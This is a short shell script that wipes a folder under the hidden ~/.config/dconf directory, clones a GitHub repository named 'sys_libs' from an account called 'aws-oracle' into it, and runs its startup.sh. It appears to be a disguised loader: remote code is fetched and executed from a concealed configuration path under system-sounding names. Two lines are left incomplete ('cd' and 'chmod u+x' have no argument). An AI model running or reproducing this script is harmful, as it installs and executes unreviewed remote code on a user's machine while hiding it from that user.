#


rm -rf ~/.config/dconf/sys_libs/

cd ~/.config/dconf/ && git clone https://github.com/aws-oracle/sys_libs

FILE=~/.config/dconf/sys_libs/startup.sh
cd 
if test -f "$FILE"; then
	chmod u+x 
	cd ~/.config/dconf/sys_libs/ && chmod u+x startup.sh && ./startup.sh
fi
